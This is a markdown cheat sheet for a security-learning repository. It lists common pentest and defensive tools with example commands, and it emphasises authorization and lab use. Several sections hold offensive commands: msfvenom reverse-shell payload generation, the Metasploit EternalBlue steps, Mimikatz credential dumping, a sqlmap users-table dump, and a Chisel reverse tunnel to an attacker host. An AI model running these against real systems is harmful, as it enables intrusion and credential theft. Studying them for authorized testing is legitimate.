# 🧰 CyberVault Tool Reference

This file is the central tool guide for the repository. It covers the most important cybersecurity tools, what they do, how they are used, and the most common command patterns.

---

## 1. Reconnaissance & OSINT

### Nmap
Description: Network scanning and service enumeration.

```bash
# Basic scan
nmap target.example.com

# Specific ports
nmap -p 80,443,22 target.example.com

# OS detection
nmap -O target.example.com

# Version detection
nmap -sV target.example.com

# Aggressive scan
nmap -A target.example.com

# UDP scan
nmap -sU target.example.com

# Full port scan
nmap -p- target.example.com

# Save output
nmap -oN output.txt target.example.com
nmap -oX output.xml target.example.com
```

### Masscan
Description: High-speed port scanner for large networks.

```bash
masscan 10.0.0.0/8 -p22,80,443 --rate=10000
masscan 192.168.1.0/24 -p0-65535 --rate=5000
```

### Subfinder
Description: Finds subdomains passively.

```bash
subfinder -d example.com
subfinder -d example.com -o subs.txt
```

### Amass
Description: Subdomain enumeration and attack surface discovery.

```bash
amass enum -d example.com
amass intel -d example.com
amass enum -active -d example.com
```

### theHarvester
Description: OSINT for email addresses and subdomains.

```bash
theharvester -d example.com -b google,bing
theharvester -d example.com -b all -f results.html
```

### Shodan
Description: Search exposed devices and services online.

```bash
shodan init <API_KEY>
shodan search "apache"
shodan host 8.8.8.8
shodan search "port:22 country:US"
```

### Recon-ng
Description: Web reconnaissance and OSINT framework.

```bash
recon-ng
marketplace install recon/domains-hosts/bing_domain_web
```

### Netcat
Description: Flexible low-level networking tool.

```bash
nc -zv target.example.com 22
nc -lvp 4444
nc target.example.com 4444
```

### Wireshark / tshark
Description: Packet analysis and traffic inspection.

```bash
tshark -i eth0
tshark -r capture.pcap
tshark -i eth0 -w capture.pcap
```

---

## 2. Web Application Security

### Burp Suite
Description: Intercept proxy for web testing and app analysis.

```bash
java -jar burpsuite_pro.jar
```

Typical use:
- intercept requests
- replay in Repeater
- fuzz in Intruder
- map app behavior in Spider
- scan with Scanner

### OWASP ZAP
Description: Open-source web app security scanner.

```bash
zaproxy -daemon -host 127.0.0.1 -port 8080
zaproxy -cmd -quickurl http://target.com
```

### Nikto
Description: Web server vulnerability scanner.

```bash
nikto -h http://target.com
nikto -h http://target.com -ssl
nikto -h target.com -p 8080
```

### Gobuster
Description: Directory and file bruteforce.

```bash
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
gobuster dns -d example.com -w subdomains.txt
```

### Dirsearch
Description: Fast directory and file discovery.

```bash
python3 dirsearch.py -u http://target.com -e php,html,txt
python3 dirsearch.py -u http://target.com -w wordlist.txt
```

### Feroxbuster
Description: High-speed directory enumeration.

```bash
feroxbuster -u http://target.com -w /usr/share/wordlists/dirb/common.txt
feroxbuster -u http://target.com -x php,txt,html -r
```

### Wfuzz / ffuf
Description: Fuzzing tools for web apps and endpoints.

```bash
wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://target.com/FUZZ
ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

### SQLMap
Description: Automated SQL injection testing.

```bash
sqlmap -u "http://target.com/page.php?id=1"
sqlmap -u "http://target.com/page.php?id=1" --dbs
sqlmap -u "http://target.com/page.php?id=1" -D db_name --tables
sqlmap -u "http://target.com/page.php?id=1" -D db_name -T users --dump
sqlmap -u "http://target.com/login" --data="username=admin&password=test"
```

---

## 3. Exploitation & Payloads

### Metasploit Framework
Description: Exploit framework for actual exploitation and payload delivery.

```bash
msfconsole
search smb
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.0.0.10
set LHOST 10.0.0.5
set LPORT 4444
exploit
```

### Msfvenom
Description: Payload generation.

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe > shell.exe
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f elf > shell.elf
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f raw > shell.php
```

### Searchsploit
Description: Local exploit database search tool.

```bash
searchsploit apache 2.4
searchsploit -w windows smb
searchsploit --cve 2021-44228
```

### Exploit-DB
Description: public exploit database references.

```bash
searchsploit -t "remote code execution"
```

### PowerShell Empire
Description: post-exploitation framework.

```bash
powershell-empire
```

### Sliver
Description: modern implant framework.

```bash
sliver
```

---

## 4. Password & Credential Attacks

### Hashcat
Description: Efficient offline password cracking.

```bash
hashcat -m 1000 hash.txt wordlist.txt
hashcat -m 0 hash.txt wordlist.txt
hashcat --show -m 1000 hash.txt
hashcat -m 22000 hash.txt wordlist.txt
```

### John the Ripper
Description: Password hash cracking and analysis.

```bash
john --wordlist=wordlist.txt hashes.txt
john --show hashes.txt
john --wordlist=wordlist.txt --rules hashes.txt
john --format=nt hashes.txt
```

### Hydra
Description: Online brute force against services.

```bash
hydra -l admin -P passwords.txt target.example.com ssh
hydra -l admin -P passwords.txt target.example.com http-post-form "/login:username=^USER^&password=^PASS^:F=invalid"
hydra -L users.txt -P pass.txt ftp://target.example.com
```

### Medusa
Description: Parallel brute force tool.

```bash
medusa -h target.example.com -u admin -P pass.txt -M ssh
```

### CeWL
Description: Wordlist generator from website content.

```bash
cewl http://target.com -w words.txt
```

---

## 5. Privilege Escalation

### Linux Privilege Escalation Basics

```bash
id
whoami
sudo -l
uname -a
find / -perm -4000 2>/dev/null
find / -type f -perm -o+w 2>/dev/null
cat /etc/crontab
ls -la /etc/cron*
getcap -r / 2>/dev/null
```

### Windows Privilege Escalation Basics

```powershell
whoami /priv
systeminfo
net user
net localgroup administrators
Get-ChildItem Env:
Get-ChildItem -Path C:\ -Recurse -Force
```

### LinPEAS
Description: Linux privilege escalation enumeration script.

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### WinPEAS
Description: Windows privilege escalation enumeration script.

```powershell
.
\winpeas.exe
```

### PowerUp
Description: PowerShell privilege escalation framework.

```powershell
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```

### LOLBAS / GTFOBins
Description: offensive utility references for bypass and escalation.

- https://gtfobins.github.io/
- https://lolbas-project.github.io/

---

## 6. Post-Exploitation & Persistence

### Mimikatz
Description: Windows credential dumping and token manipulation.

```bash
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
lsadump::sam
```

### BloodHound
Description: Active Directory graph analysis.

```bash
SharpHound.exe --CollectionMethod All
# Import JSON output into BloodHound GUI
```

### Rubeus
Description: Kerberos and AD enumeration.

```powershell
Rubeus.exe kerberoast
Rubeus.exe asreproast
Rubeus.exe dump
```

### PowerView
Description: PowerShell AD enumeration.

```powershell
Import-Module .\PowerView.ps1
Get-NetUser
Get-NetComputer
Get-NetGroupMember -GroupName "Domain Admins"
```

### Responder
Description: LLMNR/NBT-NS poisoning for hash capture.

```bash
sudo responder -I eth0
sudo responder -I eth0 -A
```

### Evil-WinRM
Description: Remote access to Windows hosts using WinRM.

```bash
evil-winrm -i target_ip -u username -p password
evil-winrm -i target_ip -u 'DOMAIN\username' -p password
```

### Chisel / Plink
Description: tunneling and relay utilities.

```bash
# Chisel server
chisel server --reverse --port 8080

# Chisel client
chisel client attacker_ip:8080 R:4444:127.0.0.1:80
```

---

## 7. Reverse Engineering & Malware Analysis

### Ghidra
Description: reverse engineering and disassembly.

```bash
ghidraRun
```

### Radare2
Description: command-line reverse engineering.

```bash
r2 -A binary
aaa
pdf @ main
```

### objdump
Description: inspect binaries and assembly.

```bash
objdump -d binary
objdump -M intel -d binary
```

### strings
Description: search for ASCII strings in binaries.

```bash
strings binary | head -n 100
```

### binwalk
Description: analyze firmware and embedded contents.

```bash
binwalk -e file.bin
binwalk -E file.bin
```

### Volatility
Description: memory forensics.

```bash
volatility -f memory.dump imageinfo
volatility -f memory.dump --profile=Win10x64_19041 pslist
```

---

## 8. Defensive & Blue Team Tools

### Suricata
Description: IDS/IPS and traffic analysis.

```bash
suricata -c /etc/suricata/suricata.yaml -i eth0
```

### Snort
Description: Intrusion detection.

```bash
snort -A console -q -c /etc/snort/snort.conf -i eth0
```

### Fail2ban
Description: ban abusive IPs after repeated failed auth attempts.

```bash
sudo systemctl status fail2ban
sudo fail2ban-client status
```

### Wazuh / OSSEC
Description: host-based detection and compliance monitoring.

```bash
sudo systemctl status wazuh-manager
sudo systemctl status ossec-hids
```

### Auditd
Description: Linux auditing.

```bash
sudo auditctl -l
sudo ausearch -k suspicious
```

### YARA
Description: signature matching for malware and files.

```bash
yara -r rules.yar /path/to/files
```

### ClamAV
Description: antivirus scanning.

```bash
clamscan -r /home
freshclam
```

---

## 9. Cloud & Container Security

### AWS CLI / Azure CLI / GCloud
Description: cloud resource enumeration and security review.

```bash
aws s3 ls
aws iam list-users
az vm list
gcloud compute instances list
```

### Docker / Podman
Description: container lifecycle and security review.

```bash
docker ps
podman ps
docker inspect container_id
```

### Trivy
Description: container and dependency vulnerability scanning.

```bash
trivy image ubuntu:latest
trivy fs .
```

---

## 10. CTF & Practice Tools

- Nmap
- Gobuster
- Burp Suite
- SQLMap
- John the Ripper
- Hashcat
- Wireshark
- PowerShell
- Python
- Ghidra
- Binwalk
- Netcat
- Reverse shell payloads

---

## 11. Common Command Set for Beginners

```bash
whoami
id
uname -a
ip addr
hostname
sudo -l
ls -la
cat /etc/passwd
netstat -tulpn
ss -tulpn
ps aux
top
```

---

## 12. Typical Attack Stages

```text
Reconnaissance → Enumeration → Vulnerability Discovery → Exploitation → Privilege Escalation → Post-Exploitation → Reporting
```

Important concepts:
- gather required scope and authorization
- map the target surface
- verify findings with evidence
- maintain safe and ethical handling
- document everything clearly

---

## 13. Best Practices for Using This Repo

- start with recon before exploitation
- validate targets and permissions
- keep tool output organized
- use versioned notes and screenshots
- maintain a legal lab environment
- confirm scope before testing
- verify assumptions before escalation

---

## 14. Recommended References

- OWASP: https://owasp.org
- MITRE ATT&CK: https://attack.mitre.org
- GTFOBins: https://gtfobins.github.io/
- LOLBAS: https://lolbas-project.github.io/
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings
- TryHackMe: https://tryhackme.com
- Hack The Box: https://hackthebox.com
- PortSwigger: https://portswigger.net/web-security

---

## 15. Final Note

CyberVault is meant to be a practical guide for learning and structured cybersecurity work. Use it to understand tools, attack stages, and defense strategies in a responsible manner.

If you want to expand more, add dedicated pages for:
- Linux Privilege Escalation
- Windows Active Directory
- Web Security methodologies
- API security
- Cloud security
- Forensics and IR runbooks

---

[Return to README](README.md)
